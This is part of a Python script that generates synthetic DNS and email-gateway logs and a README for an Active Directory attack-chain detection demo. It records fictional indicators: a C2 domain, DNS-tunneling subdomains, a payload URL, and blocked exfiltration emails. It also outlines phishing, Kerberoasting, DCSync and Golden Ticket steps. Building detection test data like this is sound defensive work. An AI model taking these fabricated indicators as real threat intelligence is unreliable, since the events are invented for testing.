         "10.0.1.5" if "dc" in host else "10.0.1.20" if "sql" in host else "10.0.1.30",
         note="BloodHound — systematic DNS enumeration" if host==list(["dc-01.corp.local"])[0] else None))

# ── C2 domain — mshta initial (08:57) ──
d(dq("2024-03-15T08:57:03Z","10.0.0.111","srv4521.cloud-update-svc.net","A","45.155.205.233",
     note="MALICIOUS — C2 domain resolved (attacker infrastructure)"))

# ── DGA-like subdomains / DNS tunneling (09:35-10:45) ──
dga_queries = [
    ("09:35:14","10.0.0.111","a7f3x2k.cloud-update-svc.net","TXT","\"data:aGFzaGVzLnR4dA==\""),
    ("09:35:16","10.0.0.111","b8g4y3l.cloud-update-svc.net","TXT","\"data:AAAAA\""),
    ("10:08:22","10.0.1.20","c9h5z4m.cloud-update-svc.net","TXT","\"data:bmV4dA==\""),
    ("10:08:24","10.0.1.20","d0i6a5n.cloud-update-svc.net","TXT","\"data:BBBBB\""),
    ("10:45:00","10.0.1.20","krbtgt_hash_exfil.a1b2c3d4e5.cloud-update-svc.net","TXT","NXDOMAIN"),
    ("14:10:02","10.0.1.20","ntds_chunk_001.xn--e1afmapc.cloud-update-svc.net","TXT","\"ack\""),
    ("14:10:04","10.0.1.20","ntds_chunk_002.xn--e1afmapc.cloud-update-svc.net","TXT","\"ack\""),
    ("14:10:06","10.0.1.20","ntds_chunk_003.xn--e1afmapc.cloud-update-svc.net","TXT","\"ack\""),
]
for ts,c,q,t,r in dga_queries:
    d(dq(f"2024-03-15T{ts}Z",c,q,t,r,
         note="DNS tunneling / data exfil — long random subdomain TXT query"))

# ── Reverse DNS lookups (attacker scanning) ──
d(dq("2024-03-15T09:10:19Z","10.0.0.111","10.0.1.5.in-addr.arpa","PTR","DC-01.corp.local",
     note="BloodHound reverse DNS"))
d(dq("2024-03-15T09:10:22Z","10.0.0.111","10.0.1.20.in-addr.arpa","PTR","SQLSERVER-01.corp.local"))
d(dq("2024-03-15T09:10:25Z","10.0.0.111","10.0.1.30.in-addr.arpa","PTR","FILESERVER-01.corp.local"))

# ── Normal end of day ──
for ts,c,q,t,r in [
    ("17:00:00","10.0.0.111","www.google.com","A","172.217.21.14"),
    ("17:15:00","10.0.0.105","teams.microsoft.com","A","13.107.64.21"),
    ("17:30:00","10.0.0.88","ocsp.digicert.com","A","93.184.220.29"),
]:
    d(dq(f"2024-03-15T{ts}Z",c,q,t,r))

lines = "\n".join(dns)
(OUT / "dns_query_log.jsonl").write_text(lines, encoding="utf-8")
print(f"dns_query_log.jsonl  ({len(dns)} events)")

# ---------------------------------------------------------------------------
# 5. Email Gateway Events  (email_gateway_events.jsonl)
# ---------------------------------------------------------------------------

email = []
e = email.append

def em(ts, sender, recipient, subject, action, size_kb, note=None, **kw):
    r = {"datetime": ts, "hostname": "MAILGW-01", "username": recipient,
         "message": f"Email {action}: from={sender} to={recipient} subj='{subject}'",
         "sender": sender, "recipient": recipient, "subject": subject,
         "action": action, "size_kb": size_kb}
    if note:
        r["note"] = note
    r.update(kw)
    return json.dumps(r)

# ── Normal business email (07:00-08:55) ──
normal_email = [
    ("07:01:00","cfo@corp.local","mwilson@corp.local","Q1 Budget Review — Action Required","DELIVERED",48),
    ("07:05:00","hr-team@corp.local","jsmith@corp.local","Open Enrollment Reminder","DELIVERED",22),
    ("07:10:00","it-alerts@corp.local","itadmin@corp.local","Server health report — 07:00 UTC","DELIVERED",18),
    ("07:15:00","vendor@sap.com","mwilson@corp.local","SAP Invoice #INV-2024-0342","DELIVERED",120),
    ("07:22:00","noreply@microsoft.com","itadmin@corp.local","Azure AD sign-in from new device","DELIVERED",15),
    ("07:35:00","ceo@corp.local","mwilson@corp.local","Urgent: Board presentation update","DELIVERED",8),
    ("07:44:00","jsmith@corp.local","mwilson@corp.local","Re: Finance team outing","DELIVERED",6),
    ("07:55:00","svc-alerts@corp.local","itadmin@corp.local","Backup completed: FILESERVER-01","DELIVERED",12),
    ("08:02:00","compliance@corp.local","jsmith@corp.local","Policy acknowledgement due Friday","DELIVERED",24),
    ("08:10:00","auditors@kpmg.com","mwilson@corp.local","Data request — audit 2024","DELIVERED",32),
    ("08:18:00","mwilson@corp.local","cfo@corp.local","Re: Q1 Budget — attached revised","DELIVERED",86),
    ("08:25:00","itadmin@corp.local","all-staff@corp.local","System maintenance window: Sat 22:00-02:00","DELIVERED",10),
    ("08:35:00","newsletter@linkedin.com","jsmith@corp.local","Top jobs for you this week","DELIVERED",44),
    ("08:42:00","noreply@zoom.us","mwilson@corp.local","Zoom meeting recording available","DELIVERED",18),
    ("08:50:00","support@adobe.com","itadmin@corp.local","License renewal: Acrobat 2024","DELIVERED",22),
]
for ts,s,r,sub,act,sz in normal_email:
    e(em(f"2024-03-15T{ts}Z",s,r,sub,act,sz))

# ── PHISHING EMAIL — delivers HTA (08:53) ──
e(em("2024-03-15T08:53:12Z",
     "no-reply@financial-doc-secure.com",
     "mwilson@corp.local",
     "URGENT: Q1 Finance Report — Secure Document Access Required",
     "DELIVERED", 420,
     attachment="Q1_Finance_Report_Secure.hta",
     sender_ip="185.220.101.47",
     spf_result="FAIL",
     dkim_result="FAIL",
     spam_score=8.2,
     url_in_body="http://45.155.205.233/payload.hta",
     note="PHISHING — HTA attachment, spoofed finance domain, SPF/DKIM fail, links to C2"))

# ── Gateway blocked a similar phish to jsmith 5 min earlier ──
e(em("2024-03-15T08:48:05Z",
     "no-reply@financial-doc-secure.com",
     "jsmith@corp.local",
     "URGENT: Q1 Finance Report — Secure Document Access Required",
     "BLOCKED", 420,
     attachment="Q1_Finance_Report_Secure.hta",
     sender_ip="185.220.101.47",
     spf_result="FAIL",
     dkim_result="FAIL",
     spam_score=8.2,
     block_reason="HTA attachment blocked by policy",
     note="PHISHING BLOCKED — same campaign, blocked for jsmith due to HTA policy"))

# ── Same sender probing itadmin (08:55) ──
e(em("2024-03-15T08:55:01Z",
     "no-reply@financial-doc-secure.com",
     "itadmin@corp.local",
     "IT Security — Please review attached compliance report",
     "BLOCKED", 388,
     attachment="IT_Compliance_2024.hta",
     sender_ip="185.220.101.47",
     spf_result="FAIL",
     dkim_result="FAIL",
     spam_score=8.5,
     block_reason="HTA attachment blocked by policy; domain on threat intel blocklist",
     note="PHISHING BLOCKED — same actor probing IT admin account"))

# ── Post-compromise: mwilson data exfil via email (14:15) ──
e(em("2024-03-15T14:15:44Z",
     "mwilson@corp.local",
     "exfil@protonmail.com",
     "docs",
     "BLOCKED", 12800,
     attachment="corp_bloodhound.zip",
     dlp_triggered=True,
     dlp_rule="Large attachment to external free email",
     block_reason="DLP: external recipient + large attachment + known threat actor domain pattern",
     note="EXFILTRATION BLOCKED — BloodHound zip sent to ProtonMail, DLP triggered"))

# ── mwilson sends 3 more reconnaissance results (15:10-15:20) ──
e(em("2024-03-15T15:10:22Z",
     "mwilson@corp.local",
     "exfil@protonmail.com",
     "report",
     "BLOCKED", 3400,
     dlp_triggered=True,
     dlp_rule="Sensitive data transmission attempt",
     note="EXFILTRATION BLOCKED — repeated attempt, DLP blocked"))
e(em("2024-03-15T15:18:55Z",
     "mwilson@corp.local",
     "backup@gmail.com",
     "backup",
     "BLOCKED", 2800,
     dlp_triggered=True,
     dlp_rule="Sensitive data transmission attempt",
     note="EXFILTRATION BLOCKED — pivot to Gmail, still blocked"))

# ── Normal end of day ──
for ts,s,r,sub,act,sz in [
    ("16:00:00","cfo@corp.local","mwilson@corp.local","Re: Budget — looks good","DELIVERED",8),
    ("16:15:00","hr-team@corp.local","jsmith@corp.local","Team meeting rescheduled to Friday","DELIVERED",6),
    ("17:00:00","noreply@microsoft.com","itadmin@corp.local","Monthly Azure security digest","DELIVERED",32),
    ("17:20:00","audit@corp.local","mwilson@corp.local","Reminder: expense reports due by EOW","DELIVERED",10),
]:
    e(em(f"2024-03-15T{ts}Z",s,r,sub,act,sz))

lines = "\n".join(email)
(OUT / "email_gateway_events.jsonl").write_text(lines, encoding="utf-8")
print(f"email_gateway_events.jsonl  ({len(email)} events)")

# ---------------------------------------------------------------------------
# README
# ---------------------------------------------------------------------------
readme = textwrap.dedent("""
    # 01_AD_Full_Attack_Chain — Demo Scenario

    ## Scenario Overview
    APT actor compromises Finance workstation (WS-FIN01 / mwilson) via phishing HTA,
    pivots to SQLSERVER-01 via PsExec, dumps LSASS, performs DCSync from SQLSERVER-01,
    forges a Golden Ticket, and reaches DC-01 via WMI. Achieves Domain Admin persistence.

    ## Environment
    | Host            | IP          | Role                  |
    |-----------------|-------------|----------------------|
    | DC-01           | 10.0.1.5    | Primary DC / DNS     |
    | DC-02           | 10.0.1.6    | Secondary DC         |
    | SQLSERVER-01    | 10.0.1.20   | SQL Server (pivot)   |
    | WS-FIN01        | 10.0.0.111  | mwilson / Finance    |
    | WS-HR01         | 10.0.0.105  | jsmith / HR          |
    | WS-IT01         | 10.0.0.88   | itadmin / IT         |
    | FILESERVER-01   | 10.0.1.30   | File server          |
    | C2 server       | 45.155.205.233 | Attacker (external) |

    ## Attack Timeline (2024-03-15)
    - 08:53 — Phishing email with HTA attachment delivered to mwilson
    - 08:57 — mshta.exe spawned; PowerShell beacon to C2:443
    - 09:00 — Registry Run key persistence + beacon binary dropped
    - 09:10 — SharpHound BloodHound recon (LDAP burst to DC-01:389)
    - 09:28 — Rubeus Kerberoasting (RC4-HMAC TGS surge to DC-01:88)
    - 09:45 — AS-REP roasting attempt (svc-legacy account)
    - 10:05 — PsExec lateral movement → SQLSERVER-01 (SMB :445)
    - 13:02 — procdump LSASS memory dump on SQLSERVER-01
    - 14:01 — impacket DCSync → extract NTDS hashes
    - 14:10 — NTDS exfiltration to C2 (4.2 MB upload over HTTPS)
    - 14:30 — Golden Ticket forged and presented to DC-01
    - 15:05 — Backdoor account svc-backup2 created, added to Domain Admins
    - 15:45 — Security event log cleared
    - 15:55 — WMI remote execution on DC-01

    ## Log Files (for cross-source correlation)
    | File                             | Source              | Events | Key Artifacts                              |
    |----------------------------------|---------------------|--------|--------------------------------------------|
    | dc01_security_eventlog.jsonl     | DC-01 Security log  | ~55    | 4769 RC4, 4662 DCSync, 4720/4728 backdoor |
    | sysmon_endpoint_telemetry.jsonl  | Sysmon (3 hosts)    | ~35    | mshta, Rubeus, PsExec, procdump, impacket |
    | firewall_netflow.jsonl           | Perimeter FW flows  | ~80    | C2 beacon pattern, NTDS exfil 4.2 MB      |
    | dns_query_log.jsonl              | DNS server          | ~55    | C2 domain, DGA subdomains, LDAP enum       |
    | email_gateway_events.jsonl       | Mail gateway        | ~25    | Phishing delivery, DLP blocked exfil       |
    | scenario_apt_kerberoasting.jsonl | Endpoint events     | —      | Kerberoasting detail (supplement)          |
    | ad_attack_scenario.jsonl         | Full AD chain       | 62     | End-to-end chain reference events          |

    ## How to Use for Correlation
    1. Import ALL files as a single case/upload in the FIP application.
    2. Run **Full Analysis** — the Isolation Forest + ML anomaly engine will detect:
       - Kerberos ticket rate spike (09:28-09:32)
       - LDAP recon burst (09:10-09:11)
       - C2 beacon regularity pattern
    3. Run **LMD Analysis** — the AD RF model will classify:
       - Kerberoasting, BloodHound/AD Recon, DCSync/CredTheft, Lateral Movement
    4. Run **Timeline** — cross-correlate phishing email → mshta spawn → Kerberoasting → DCSync → Golden Ticket
    5. **MITRE ATT&CK** coverage: T1566 (Phishing) → T1218.005 (mshta) → T1069.002 (BloodHound) →
       T1558.003 (Kerberoasting) → T1021.002 (PsExec) → T1003.001 (LSASS) → T1003.006 (DCSync) →
       T1558.001 (Golden Ticket) → T1136.001 (Account Creation) → T1078 (Valid Accounts)
""").strip()

(OUT / "README.md").write_text(readme, encoding="utf-8")
print("README.md written")
print("\nDone. All files in:", OUT)
